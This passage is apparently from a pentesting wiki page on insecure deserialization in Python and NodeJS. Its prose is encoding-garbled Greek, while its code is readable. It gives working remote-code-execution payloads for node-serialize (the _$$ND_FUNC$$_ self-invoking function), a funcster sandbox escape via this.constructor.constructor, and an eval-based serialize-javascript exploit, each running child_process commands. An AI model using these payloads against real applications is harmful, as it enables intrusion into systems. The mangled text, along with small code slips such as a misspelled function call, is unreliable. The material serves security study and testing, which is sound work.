Î— Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÎµÎ»Î¯Î´Î± Ï€Î±ÏÎ¿Ï…ÏƒÎ¹Î¬Î¶ÎµÎ¹ Ï„Î·Î½ Ï„ÎµÏ‡Î½Î¹ÎºÎ® Î³Î¹Î± **ÎºÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ· Î¼Î¹Î±Ï‚ Î¼Î· Î±ÏƒÏ†Î±Î»Î¿ÏÏ‚ Î±Ï€Î¿ÏƒÏ…Î¼Ï€Î¯ÎµÏƒÎ·Ï‚ ÏƒÎµ yamls** Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ python ÎºÎ±Î¹ Ï„ÎµÎ»ÎµÎ¹ÏÎ½ÎµÎ¹ Î¼Îµ Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ RCE deserialization payload Î³Î¹Î± **Pickle, PyYAML, jsonpickle ÎºÎ±Î¹ ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Class Pollution (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magic Functions

JS **Î´ÎµÎ½ Î­Ï‡ÎµÎ¹ "Î¼Î±Î³Î¹ÎºÎ­Ï‚" ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚** ÏŒÏ€Ï‰Ï‚ PHP Î® Python Ï€Î¿Ï… Î¸Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ Î±Ï€Î»ÏÏ‚ Î³Î¹Î± Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎµÎ½ÏŒÏ‚ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï…. Î‘Î»Î»Î¬ Î­Ï‡ÎµÎ¹ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ **ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚** Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ **ÏƒÏ…Ï‡Î½Î¬ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ¼ÎµÎ½ÎµÏ‚ Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï„Î¹Ï‚ ÎºÎ±Î»ÎµÎ¯Ï„Îµ Î¬Î¼ÎµÏƒÎ±** ÏŒÏ€Ï‰Ï‚ **`toString`**, **`valueOf`**, **`toJSON`**.\
Î‘Î½ ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Î¼Î¹Î± Î±Ï€Î¿ÏƒÏ…Î¼Ï€Î¯ÎµÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÏƒÏ…Î¼Î²Î¹Î²Î¬ÏƒÎµÏ„Îµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î¬Î»Î»Î¿ ÎºÏÎ´Î¹ÎºÎ±** (Ï€Î¹Î¸Î±Î½ÏÏ‚ ÎºÎ±Ï„Î±Ï‡ÏÏÎ½Ï„Î±Ï‚ Ï„Î¹Ï‚ Î¼Î¿Î»ÏÎ½ÏƒÎµÎ¹Ï‚ Ï€ÏÏ‰Ï„Î¿Ï„ÏÏ€Î¿Ï…) Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ ÎºÏÎ´Î¹ÎºÎ± ÏŒÏ„Î±Î½ ÎºÎ±Î»Î¿ÏÎ½Ï„Î±Î¹.

ÎˆÎ½Î±Ï‚ Î¬Î»Î»Î¿Ï‚ **"Î¼Î±Î³Î¹ÎºÏŒÏ‚" Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·** Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï„Î·Î½ ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ Î¬Î¼ÎµÏƒÎ± ÎµÎ¯Î½Î±Î¹ Î¼Îµ Ï„Î¿ **Î½Î± ÏƒÏ…Î¼Î²Î¹Î²Î¬ÏƒÎµÏ„Îµ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Ï€Î¿Ï… ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î¼Î¹Î± async ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·** (Ï…Ï€ÏŒÏƒÏ‡ÎµÏƒÎ·). Î”Î¹ÏŒÏ„Î¹, Î±Î½ **Î¼ÎµÏ„Î±Ï„ÏÎ­ÏˆÎµÏ„Îµ** Î±Ï…Ï„ÏŒ Ï„Î¿ **ÎµÏ€Î¹ÏƒÏ„ÏÎµÏ†ÏŒÎ¼ÎµÎ½Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿** ÏƒÎµ Î¬Î»Î»Î· **Ï…Ï€ÏŒÏƒÏ‡ÎµÏƒÎ·** Î¼Îµ Î¼Î¹Î± **Î¹Î´Î¹ÏŒÏ„Î·Ï„Î±** Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ **"then" Ï„ÏÏ€Î¿Ï… ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚**, Î¸Î± **ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹** Î±Ï€Î»ÏÏ‚ ÎµÏ€ÎµÎ¹Î´Î® ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î¬Î»Î»Î· Ï…Ï€ÏŒÏƒÏ‡ÎµÏƒÎ·. _Î‘ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ_ [_**Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ ÏƒÏÎ½Î´ÎµÏƒÎ¼Î¿**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _Î³Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` ÎºÎ±Î¹ `prototype` ÏÏÏ€Î±Î½ÏƒÎ·

Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Î³Î¹Î± Î±Ï…Ï„Î® Ï„Î·Î½ Ï„ÎµÏ‡Î½Î¹ÎºÎ® **ÏÎ¯Î¾Ï„Îµ Î¼Î¹Î± Î¼Î±Ï„Î¹Î¬ ÏƒÏ„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÎµÎ¼Î¹Î½Î¬ÏÎ¹Î¿**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Î‘Ï…Ï„Î® Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½. Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
Î¤Î¿ **ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿** Î¸Î± Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ ÏŒÏ€Ï‰Ï‚:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÏŒÏ„Î¹ ÏŒÏ„Î±Î½ Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· ÎµÎ¯Î½Î±Î¹ ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î·, Î· ÏƒÎ·Î¼Î±Î¯Î± `_$$ND_FUNC$$_` Ï€ÏÎ¿ÏƒÏ„Î¯Î¸ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿.

ÎœÎ­ÏƒÎ± ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `node-serialize/lib/serialize.js` Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î·Î½ Î¯Î´Î¹Î± ÏƒÎ·Î¼Î±Î¯Î± ÎºÎ±Î¹ Ï€ÏÏ‚ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï„Î· Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

ÎŒÏ€Ï‰Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î¿ ÎºÎ¿Î¼Î¼Î¬Ï„Î¹ ÎºÏÎ´Î¹ÎºÎ±, **Î±Î½ Î²ÏÎµÎ¸ÎµÎ¯ Î· ÏƒÎ·Î¼Î±Î¯Î±** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Ï„Î¿ `eval` Î³Î¹Î± Î½Î± Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·, Î¿Ï€ÏŒÏ„Îµ Î²Î±ÏƒÎ¹ÎºÎ¬ **Î· ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `eval`**.

Î©ÏƒÏ„ÏŒÏƒÎ¿, **Î±Ï€Î»Î¬ ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚** Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· **Î´ÎµÎ½ Î¸Î± Ï„Î·Î½ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹** ÎºÎ±Î¸ÏÏ‚ Î¸Î± Î®Ï„Î±Î½ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ ÎºÎ¬Ï€Î¿Î¹Î¿ Î¼Î­ÏÎ¿Ï‚ Ï„Î¿Ï… ÎºÏÎ´Î¹ÎºÎ± Î½Î± **ÎºÎ±Î»ÎµÎ¯ Ï„Î¿ `y.rce`** ÏƒÏ„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î¬ Î¼Î±Ï‚ ÎºÎ±Î¹ Î±Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï€Î¿Î»Ï **Î±Ï€Î¯Î¸Î±Î½Î¿**.\
ÎŸÏÏ„Ï‰Ï‚ Î® Î¬Î»Î»Ï‰Ï‚, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î±Ï€Î»Î¬ Î½Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿** **Ï€ÏÎ¿ÏƒÎ¸Î­Ï„Î¿Î½Ï„Î±Ï‚ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Ï€Î±ÏÎµÎ½Î¸Î­ÏƒÎµÎ¹Ï‚** ÏÏƒÏ„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± Î· ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· ÏŒÏ„Î±Î½ Ï„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹.\
Î£Ï„Î¿ ÎµÏ€ÏŒÎ¼ÎµÎ½Î¿ ÎºÎ¿Î¼Î¼Î¬Ï„Î¹ ÎºÏÎ´Î¹ÎºÎ± **Ï€ÏÎ¿ÏƒÎ­Î¾Ï„Îµ Ï„Î·Î½ Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î± Ï€Î±ÏÎ­Î½Î¸ÎµÏƒÎ·** ÎºÎ±Î¹ Ï€ÏÏ‚ Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `unserialize` Î¸Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ±:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
ÎŒÏ€Ï‰Ï‚ Î±Î½Î±Ï†Î­ÏÎ¸Î·ÎºÎµ Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚, Î±Ï…Ï„Î® Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· Î¸Î± Ï€Î¬ÏÎµÎ¹ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Î¼ÎµÏ„Î¬ Ï„Î¿ `_$$ND_FUNC$$_` ÎºÎ±Î¹ Î¸Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹** Î±Ï…Ï„ÏŒÎ½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ `eval`. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î³Î¹Î± Î½Î± **Î±Ï…Ï„Î¿ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÏ„Îµ Ï„Î¿ Î¼Î­ÏÎ¿Ï‚ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±Ï‚ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚** ÎºÎ±Î¹ Ï„Î·Î½ Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î± Ï€Î±ÏÎ­Î½Î¸ÎµÏƒÎ· ÎºÎ±Î¹ **Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Ï€Î»Î¬ Î¼Î¹Î± JS oneliner** ÏŒÏ€Ï‰Ï‚ ÏƒÏ„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± [**Î²ÏÎµÎ¯Ï„Îµ ÎµÎ´Ï**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚** ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ Ï€ÏÏ‚ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±.

### [funcster](https://www.npmjs.com/package/funcster)

ÎˆÎ½Î± Î±Î¾Î¹Î¿ÏƒÎ·Î¼ÎµÎ¯Ï‰Ï„Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ Ï„Î¿Ï… **funcster** ÎµÎ¯Î½Î±Î¹ Î· Î±Ï€ÏÎ¿ÏƒÎ²Î»Î·Ï„ÏŒÏ„Î·Ï„Î± Ï„Ï‰Î½ **Ï„Ï…Ï€Î¹ÎºÏÎ½ ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Ï‰Î½ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Ï‰Î½**; Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ ÎµÎºÏ„ÏŒÏ‚ Ï„Î¿Ï… Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î¿Ï… Ï€ÎµÎ´Î¯Î¿Ï…. Î‘Ï…Ï„Î® Î· Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÏ„Î¹ÎºÎ® Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® Î±Ï€Î¿Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÏÎ´Î¹ÎºÎ± Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯ Î½Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚ ÏƒÎµ ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î±, Î¿Î´Î·Î³ÏÎ½Ï„Î±Ï‚ ÏƒÎµ ÎµÎ¾Î±Î¹ÏÎ­ÏƒÎµÎ¹Ï‚ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ `"ReferenceError: console is not defined"` ÏŒÏ„Î±Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ ÎµÎ½Ï„Î¿Î»Î­Ï‚ ÏŒÏ€Ï‰Ï‚ `console.log()` Î® `require(something)`.

Î Î±ÏÎ¬ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼ÏŒ, Î· Î±Ï€Î¿ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï€Î»Î®ÏÎ¿Ï…Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î¿ Ï€Î±Î³ÎºÏŒÏƒÎ¼Î¹Î¿ Ï€Î»Î±Î¯ÏƒÎ¹Î¿, ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î±Î½Î¿Î¼Î­Î½Ï‰Î½ ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ Ï„Ï…Ï€Î¹ÎºÏÎ½ ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Ï‰Î½ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Ï‰Î½, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î¼Î­ÏƒÏ‰ Î¼Î¹Î±Ï‚ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î·Ï‚ Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ·Ï‚. Î•ÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Î¹ Î¬Î¼ÎµÏƒÎ± Ï„Î¿ Ï€Î±Î³ÎºÏŒÏƒÎ¼Î¹Î¿ Ï€Î»Î±Î¯ÏƒÎ¹Î¿, Î¼Ï€Î¿ÏÎµÎ¯ ÎºÎ±Î½ÎµÎ¯Ï‚ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼ÏŒ. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï€Î¿ÎºÎ±Ï„Î±ÏƒÏ„Î±Î¸ÎµÎ¯ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î±Ï€ÏŒÏƒÏ€Î±ÏƒÎ¼Î±:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Î“Î¹Î±**[ **Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î´Î¹Î±Î²Î¬ÏƒÏ„Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€Î·Î³Î®**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Î¤Î¿ Ï€Î±ÎºÎ­Ï„Î¿ **serialize-javascript** Î­Ï‡ÎµÎ¹ ÏƒÏ‡ÎµÎ´Î¹Î±ÏƒÏ„ÎµÎ¯ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ Î³Î¹Î± ÏƒÎºÎ¿Ï€Î¿ÏÏ‚ ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚, Ï‡Ï‰ÏÎ¯Ï‚ ÎºÎ±Î¼Î¯Î± ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚. ÎŸÎ¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ ÎµÎ¯Î½Î±Î¹ Ï…Ï€ÎµÏÎ¸Ï…Î½Î¿Î¹ Î³Î¹Î± Ï„Î·Î½ Ï…Î»Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î·Ï‚ Î´Î¹ÎºÎ®Ï‚ Ï„Î¿Ï…Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï… Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚. ÎœÎ¹Î± Î¬Î¼ÎµÏƒÎ· Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… `eval` Ï€ÏÎ¿Ï„ÎµÎ¯Î½ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î³Î¹Î± Ï„Î·Î½ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Î‘Î½ Î±Ï…Ï„Î® Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± Î±Ï€Î¿Î´Î¿Î¼Î®ÏƒÎµÎ¹ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î±, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ ÎµÏÎºÎ¿Î»Î±**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Î“Î¹Î±**[ **Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î´Î¹Î±Î²Î¬ÏƒÏ„Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€Î·Î³Î®**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Î’Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· Cryo

